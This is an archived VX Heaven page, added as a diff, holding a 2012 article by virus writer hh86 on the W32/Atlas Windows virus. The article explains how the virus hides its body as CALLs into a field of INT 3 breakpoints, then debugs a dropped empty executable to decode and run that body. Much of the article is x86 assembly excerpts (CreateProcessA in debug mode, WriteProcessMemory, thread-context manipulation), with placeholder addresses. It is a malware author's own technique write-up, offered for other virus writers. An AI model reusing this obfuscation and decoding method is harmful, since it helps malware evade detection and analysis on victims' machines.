@@ -1,0 +1,178 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> hh86 'Debug Assisted Decoding' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="hh86"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, hh86,Debug Assisted Decoding, push, context, debug, address, virus, body, setthreadcontext, encoded, decoded, flag, step, dword, debugee, label, event"/>
+<meta name="Description" content="This is an old project I had. I worked on it one night a year ago but did not work on it any further. Source code was lost. But now I have a new one. This is also a remake of W32/POSEY (Peter Ferrie called it W32/Tussie, see Virus Bulletin, August 2012). I have no idea why they change the name to my code, but I call this one W32/Atlas. It is my first virus to implement debugging techniques."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"bfccd2d6fcf957fdc1b4d7a63296748c6d1fe3af-1498756041-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhh10.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Debug Assisted Decoding</h1><p><a href="/lib/?lang=en&amp;author=hh86"> hh86</a><br/> <em><a href="/vx.php?fid=2009#f2009">Valhalla #3</a></em><br/> <em>December 2012</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhh10.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vhh10">Back to index</a>] [<a href="/lib/vhh10.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c1">About Atlas</a></li>
+<li><a href="#c2">Life, the Universe and...</a></li>
+<li><a href="#c3">Debug Gravitation</a>
+<ul>
+<li><a href="#c31">Step 1</a></li>
+<li><a href="#c32">Step 2, tidal force.</a></li>
+<li><a href="#c33">Step 3</a></li>
+</ul></li>
+<li><a href="#c4">Outro</a></li>
+</ul>
+<h2><a name="c1"></a>About Atlas</h2>
+<p>This is an old project I had. I worked on it one night a year ago but did not work on it any further. Source code was lost. But now I have a new one. This is also a remake of W32/POSEY (Peter Ferrie called it W32/Tussie, see Virus Bulletin, August 2012). I have no idea why they change the name to my code, but I call this one W32/Atlas. It is my first virus to implement debugging techniques.</p>
+<h2><a name="c2"></a>Life, the Universe and...</h2>
+<p>Sure enough we all know what a debugger is. Sometimes used with good benefits, sometimes not enough. In Windows you can create your own debugger using a few powerful functions.</p>
+<p>In W32/POSEY, I implemented a tiny but nice technique to obfuscate a virus by encoding it in instructions. Specifically, I used CALLs and 256 INT 3s. All you need to do is calculate the distance from the beginning of an INT 3 field to the place where an exception has just happened. The distance represents the decoded byte. This is possible because of Virtual Address Space, and Structured Exception Handling.</p>
+<p>This technique can be applied in 64-bit but you need to add an Exception Directory to the file.</p>
+<p>In order to catch such exceptions, a custom (decoder) SEH handler (which would gather the necessary data from exception records and context) is very required. W32/Atlas is the same concept, but it is a debugger (and remote SEH handler).</p>
+<h2><a name="c3"></a>Debug Gravitation</h2>
+<p>Atlas drops a PE file, with no code. So it is just headers, we fill it with code during the first steps of debugging. Next, is to create the process in debug mode.</p>
+<p>If the process is successfully created we wait for a debug event to happen.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;DEBUG_PROCESS<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;CreateProcessA<br/>
+&nbsp;</div>
+<h3><a name="c31"></a>Step 1</h3>
+<p>In fact, many will happen, but ignore them all, unless it is an exception event.</p>
+<p>The first exception event (if everything goes according to plan) should happen right before the system runs the code at debugee entrypoint. Atlas checks an internal flag (boolean). If the flag is not set, this is the first exception, and we must fill debugee's code section with the encoded body, then we let this event pass with DBG_CONTINUE. If the flag was set, this could mean that we just hit an INT 3 in the INT 3 field, we assume it did and proceed to decode. If the exception event was no breakpoint, we let it pass with DBG_EXCEPTION_NOT_HANDLED, this will cause the process to crash, and go to step 3.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">init_dbg &nbsp; &nbsp; &nbsp; &nbsp;label &nbsp; &nbsp;near<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;TIMEWAIT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;WaitForDebugEvent<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span> <span style="color: #339933;">+</span> DEBUG_EVENT<span style="color: #339933;">.</span>dwDebugEventCode<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> EXCEPTION_DEBUG_EVENT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; debug_pass<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span> <span style="color: #339933;">+</span> DEBUG_EVENT<span style="color: #339933;">.</span>u<span style="color: #339933;">.</span>Exception<span style="color: #339933;">.</span>pExceptionRecord<span style="color: #339933;">.</span>ExceptionCode<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> EXCEPTION_BREAKPOINT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; debug_excp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; ExceptionFlag<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bl</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; debug_stde<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #7f007f;">&quot;hh86&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encoded body size</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #7f007f;">&quot;hh86&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;encoded body address</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #ff0000;">401000h</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> PROCESS_INFORMATION2<span style="color: #339933;">.</span>hProcess<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;WriteProcessMemory<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; ExceptionFlag<br/>
+<br/>
+debug_pass &nbsp; &nbsp; &nbsp;label &nbsp; &nbsp;near<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;DBG_CONTINUE<br/>
+<br/>
+debug_pstk &nbsp; &nbsp; &nbsp;label &nbsp; &nbsp;near<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span> <span style="color: #339933;">+</span> DEBUG_EVENT<span style="color: #339933;">.</span>dwThreadId<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span> <span style="color: #339933;">+</span> DEBUG_EVENT<span style="color: #339933;">.</span>dwProcessId<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;ContinueDebugEvent<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp;debug_event<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;finished debugging, do your checks here</span><br/>
+<br/>
+debug_excp &nbsp; &nbsp; &nbsp;label &nbsp; &nbsp;near<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;DBG_EXCEPTION_NOT_HANDLED<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; debug_pstk<br/>
+&nbsp;</div>
+<h3><a name="c32"></a>Step 2, tidal force.</h3>
+<p>The code reads debugee's context, this is so we can get the current stack pointer. We read the dword in the stack. The dword is the address of the next CALL. We adjust in the context the EIP register to that address. Then from the debug exception event data we get the exception address, then substract to it the address of the INT 3 field. Update debugee's context and let the event pass with DBG_CONTINUE.</p>
+<p>After every CALL is executed, a code (return to invalid address) will cause an exception other than a breakpoint, and in step 1 the debugger lets the debugee crash, and step 3 will be run.</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;hh86&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;address of CONTEXT buffer</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span> <span style="color: #339933;">+</span> CONTEXT<span style="color: #339933;">.</span>ContextFlags<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> CONTEXT_FULL<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> PROCESS_INFORMATION2<span style="color: #339933;">.</span>hThread<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;SetThreadContext</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;SetThreadContext</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;GetThreadContext<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">ebx</span> <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;sizeof CONTEXT<span style="color: #339933;">.</span>regEsp<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span> <span style="color: #339933;">+</span> CONTEXT<span style="color: #339933;">.</span>regEsp<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> PROCESS_INFORMATION2<span style="color: #339933;">.</span>hProcess<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;ReadProcessMemory<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ecx</span> <span style="color: #339933;">+</span> CONTEXT<span style="color: #339933;">.</span>regEip<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edi</span> <span style="color: #339933;">+</span> DEBUG_EVENT<span style="color: #339933;">.</span>u<span style="color: #339933;">.</span>Exception<span style="color: #339933;">.</span>pExceptionRecord<span style="color: #339933;">.</span>ExceptionAddress<span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;hh86&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;address of INT 3 field in child process virtual space</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;hh86&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;address of our buffer for decoding</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp;SetThreadContext<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; debug_pass<br/>
+&nbsp;</div>
+<h3><a name="c33"></a>Step 3</h3>
+<p>This is just a simple check, we check that the number of decoded bytes match that of the unencoded body size. If it does not, we close handlers of the process and thread, and leave. If it does, we assume that the body was correctly decoded and we run it.</p>
+<h2><a name="c4"></a>Outro</h2>
+<p>It is so funny that most viruses attempt to escape from debuggers and some use the functions to inject code into other process, but why do that when it is so funny to be a virus and a debugger at the same time? ;)</p>
+<div align="right">
+hh86<br/>
+November 2012
+</div>
+<div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhh10">de</a><a href="/lib/index.php?lang=en&amp;id=vhh10">en</a><a href="/lib/index.php?lang=es&amp;id=vhh10">es</a><a href="/lib/index.php?lang=it&amp;id=vhh10">it</a><a href="/lib/index.php?lang=fr&amp;id=vhh10">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhh10">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhh10">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhh10">ua</a></div>
+</body>
+</html>
